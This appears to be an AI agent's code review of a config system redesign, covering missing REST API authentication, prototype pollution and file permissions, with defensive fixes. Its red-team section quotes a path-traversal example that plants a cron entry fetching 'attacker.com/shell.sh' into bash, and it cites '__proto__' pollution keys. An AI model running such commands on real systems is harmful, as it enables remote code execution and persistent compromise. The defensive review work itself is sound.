---
date: 2026-04-10
agent: epost-code-reviewer
scope: config-system-redesign
files: 22
verdict: ACCEPT (with conditions)
---

# Config System Redesign — Code Review Report

## Summary

22 files reviewed across 3 stages (Spec Compliance, Code Quality, Adversarial Red-Team).
**8 ACCEPT findings, 3 DEFER, 0 REJECT.**
Code must address the 4 critical security items before merge.

## Scope Gate

- Files changed: 22 (>=3) — Stage 3 RAN
- LOC: significant new code across config domain + REST API
- Security surface: REST API + config file permissions + prototype pollution — Stage 3 REQUIRED

---

## Stage 1: Spec Compliance

**PASS** — Implementation matches stated design:

| Requirement | Status | Evidence |
|------------|--------|----------|
| DANGEROUS_KEYS prototype guard | PRESENT | `constants.ts:55`, `config-security.ts:12-14` |
| File permissions 0o600/0o700 | PRESENT | `config-security.ts:56-75` |
| REST API localhost-only | PRESENT | `server.ts:88` defaults to `localhost` |
| Env values never exposed via API | PRESENT | `config-routes.ts:153` returns `{ set: boolean }` only |
| Config merge: defaults -> global -> project | CORRECT | `config-merger.ts:82-83` two-step merge |
| Source tracking leaf-level | CORRECT | `buildSourceMap` walks all 3 layers |
| Static facade pattern | CORRECT | Both managers use static methods, no DI |
| Lazy Express loading | CORRECT | `config-ui-command.ts:17` dynamic import |
| Phase handler decomposition | CORRECT | Each handler <200 lines, single responsibility |
| Backward-compatible aliases | CORRECT | `index.ts:19-22` re-exports old names |

---

## Stage 2: Code Quality Findings

### CRITICAL-1: REST API has zero authentication [ACCEPT]
- **File**: `src/domains/web-dashboard/server.ts:92`
- **Category**: SEC (OWASP A01 — Broken Access Control)
- **Description**: Server binds to localhost but has no auth middleware. Any local process (malicious scripts, browser XSS from other localhost apps) can read all config and write arbitrary values including env vars via `PUT /env/:key`.
- **Remediation**: Add a random bearer token printed on startup, validate on every request:
  ```
  const token = randomBytes(16).toString('hex');
  // print token to console
  app.use((req, res, next) => {
    if (req.headers.authorization !== `Bearer ${token}`) return res.status(401).json({ error: 'unauthorized' });
    next();
  });
  ```

### CRITICAL-2: API PUT /config/:scope/:key does not validate against prototype pollution [ACCEPT]
- **File**: `src/domains/web-dashboard/api/config-routes.ts:52-61`
- **Category**: SEC (Prototype Pollution)
- **Description**: The `:key` param from the URL is passed directly to `GlobalConfigManager.set(key, value)` which calls `setByPath`. If key is `__proto__.polluted`, `setByPath` will set `obj.__proto__.polluted = value`, polluting all objects. The DANGEROUS_KEYS guard exists in `safeDeepMerge` but is never applied at the set path.
- **Remediation**: Add validation before line 58:
  ```ts
  import { isSafeKey } from '@/domains/config/config-security.js';
  // ...
  if (!key.split('.').every(isSafeKey)) {
    return res.status(400).json({ error: 'Invalid key: contains reserved segment' });
  }
  ```

### CRITICAL-3: `setByPath` does not guard against DANGEROUS_KEYS [ACCEPT]
- **File**: `src/domains/config/config-path-utils.ts:18-29`
- **Category**: SEC (Prototype Pollution)
- **Description**: `setByPath` blindly traverses and sets any path segment including `__proto__`, `constructor`, `prototype`. CLI handler `runSet` calls this without validation. An attacker-controlled config value with key `__proto__.admin` would pollute Object.prototype.
- **Remediation**: Add guard at start of function:
  ```ts
  export function setByPath(obj: Record<string, any>, path: string, value: any): void {
    const parts = path.split('.');
    if (parts.some(p => !isSafeKey(p))) throw new Error(`Unsafe config key: ${path}`);
    // ... rest unchanged
  }
  ```
  Import `isSafeKey` from `config-security.js`.

### CRITICAL-4: `writeKitConfig` in shared.ts bypasses file permissions [ACCEPT]
- **File**: `src/commands/config/phases/shared.ts:59-65`
- **Category**: SEC (OWASP A02 — Cryptographic Failures)
- **Description**: Uses raw `writeFile` instead of `safeWriteFile` + `enforceFilePermissions`. Config files written via TUI/CLI will have default permissions (often 644), leaking config contents to other users on shared systems.
- **Remediation**: Replace with:
  ```ts
  import { safeWriteFile } from '@/shared/file-system.js';
  import { enforceFilePermissions } from '@/domains/config/config-security.js';
  
  export async function writeKitConfig(installDir: string, config: Record<string, any>): Promise<void> {
    const configPath = join(installDir, '.epost-kit.json');
    await safeWriteFile(configPath, JSON.stringify(config, null, 2) + '\n');
    await enforceFilePermissions(configPath);
  }
  ```

### WARN-1: `deepMerge` in settings-merger.ts unprotected against DANGEROUS_KEYS [DEFER]
- **File**: `src/domains/config/settings-merger.ts:14-47`
- **Category**: SEC
- **Description**: `deepMerge` does not check for `__proto__`/`constructor`/`prototype` keys. The safe wrapper `safeDeepMerge` in `config-security.ts` filters keys before delegating, but `deepMerge` is also called directly from `mergeAllSettings` and `mergeAndWriteSettings`. If a package's settings.json contains a `__proto__` key, it would pollute through `mergeAllSettings`.
- **Verdict**: DEFER — `deepMerge` is only called from controlled internal pipelines (package settings merge). The `safeDeepMerge` wrapper covers the config API path. Low exploitation likelihood but should be hardened in a follow-up.

### WARN-2: CORS allows any localhost port [DEFER]
- **File**: `src/domains/web-dashboard/server.ts:62`
- **Category**: SEC
- **Description**: `Access-Control-Allow-Origin: http://localhost:*` is not a valid CORS value — browsers treat it as a literal string, not a wildcard. This means the header is effectively ignored and browsers will block cross-origin requests from other localhost apps. This is actually a "security by accident" situation.
- **Verdict**: DEFER — The invalid CORS value accidentally provides better security. Should be explicitly set to `http://localhost:{port}` for correctness.

### WARN-3: `sanitizeConfigValue` exported but never called [DEFER]
- **File**: `src/domains/config/config-security.ts:19-33`
- **Category**: DEAD
- **Description**: `sanitizeConfigValue` is exported but has zero callers in the codebase. It strips functions and symbols from config values, which is a good practice, but is never applied at the write boundary.
- **Verdict**: DEFER — Not dead code in spirit (it's a utility for future use), but currently unused. Apply at `setByPath` or `ProjectConfigManager.save` boundary to actually prevent function/symbol storage.

### INFO-1: `printConfig` in shared.ts duplicates `getByPath` wrapper [INFO]
- **File**: `src/commands/config/phases/shared.ts:84-91`
- `getPath` is a trivial wrapper over `getByPath` adding a fallback parameter. Used only in `tui-handler.ts`. Consider inlining or removing.

### INFO-2: `config-command.ts` is a redundant re-export layer [INFO]
- **File**: `src/commands/config/config-command.ts`
- This file re-exports the same handlers already exported from `index.ts`. It appears to be a leftover from an intermediate design. No file imports from it.

### INFO-3: `ConfigCommandOptions` in types.ts extends `ConfigOptions` redundantly [INFO]
- **File**: `src/commands/config/types.ts:18-22`
- `ConfigCommandOptions` adds `global`, `local`, `sources` — but these are already on `ConfigOptions` in `src/types/commands.ts:96-102`. This type is never imported by any file.

---

## Stage 3: Adversarial Red-Team

### ADV-1: Concurrent writes can corrupt config [ACCEPT]
- **Attack**: Two `epost-kit config set` processes running simultaneously. Both read the same config, both modify, both write. Last writer wins — silent data loss.
- **Exploitability**: Medium — CI/CD pipelines could trigger concurrent config writes.
- **Remediation**: Use file locking (e.g., `proper-lockfile` package) or write with `O_EXCL` + retry. At minimum, document that concurrent config writes are not supported.
- **Verdict**: ACCEPT for documentation. Fix is a follow-up.

### ADV-2: REST API allows arbitrary file path traversal via env keys [ACCEPT]
- **File**: `src/domains/web-dashboard/api/config-routes.ts:162-169`
- **Attack**: `PUT /env/../../etc/cron.d/backdoor` with value `* * * * * /usr/bin/curl attacker.com/shell.sh | bash`. The `key` param is passed directly to `writeEnvKey` which writes to `installDir/.env`. The `join()` call in `writeEnvKey` would normalize the path, but `writeEnvKey` receives the full `envPath` — the traversal would be against the `.env` file location, not arbitrary files. However, the key itself is not validated for shell-safe characters.
- **Actual risk**: LOW — `join()` normalizes, and the file written is always `<installDir>/.env`. But keys with spaces, newlines, or special chars could corrupt the .env file.
- **Remediation**: Validate env key format: `/^[A-Z_][A-Z0-9_]*$/`
- **Verdict**: ACCEPT

### ADV-3: Port scan reveals dashboard existence [DEFER]
- **File**: `src/domains/web-dashboard/server.ts:87-89`
- **Attack**: Port range 3456-3460 is predictable. Local attacker can scan for the dashboard.
- **Remediation**: Auth token (addresses CRITICAL-1) mitigates this.
- **Verdict**: DEFER — mitigated by fixing CRITICAL-1.

---

## Architecture Assessment

| Dimension | Rating | Notes |
|-----------|--------|-------|
| Modularity | GOOD | Clean domain separation, each file <200 lines |
| Naming | GOOD | Descriptive kebab-case, self-documenting |
| Error handling | ACCEPTABLE | Consistent try/catch in API routes, graceful fallbacks in CLI |
| Dead code | MINOR | `sanitizeConfigValue`, `config-command.ts`, `ConfigCommandOptions` unused |
| Backward compat | GOOD | Old export names preserved, default behavior unchanged |

---

## Unresolved Questions

1. Is `writeKitConfig` in shared.ts intentionally using raw `writeFile` (for TUI performance), or is this a security oversight?
2. Should `sanitizeConfigValue` be applied at every config write boundary, or only at REST API input?
3. Is concurrent config write protection needed for the CLI use case (single-user dev tool)?

---

## Verdict Summary

| ID | Severity | Category | Verdict | Must Fix? |
|----|----------|----------|---------|-----------|
| CRITICAL-1 | High | SEC (A01) | ACCEPT | YES — REST API auth |
| CRITICAL-2 | High | SEC (Pollution) | ACCEPT | YES — API key validation |
| CRITICAL-3 | High | SEC (Pollution) | ACCEPT | YES — setByPath guard |
| CRITICAL-4 | Medium | SEC (A02) | ACCEPT | YES — file permissions |
| ADV-1 | Medium | State | ACCEPT | YES — document or fix |
| ADV-2 | Low | SEC (Input) | ACCEPT | Recommended |
| WARN-1 | Low | SEC | DEFER | Follow-up |
| WARN-2 | Low | SEC | DEFER | Follow-up |
| WARN-3 | Low | DEAD | DEFER | Follow-up |
| ADV-3 | Low | SEC | DEFER | Mitigated by CRITICAL-1 |
| INFO-1 | Info | Quality | INFO | Optional |
| INFO-2 | Info | DEAD | INFO | Optional |
| INFO-3 | Info | DEAD | INFO | Optional |

**Merge decision**: Block until CRITICAL-1 through CRITICAL-4 are fixed. All others are non-blocking.
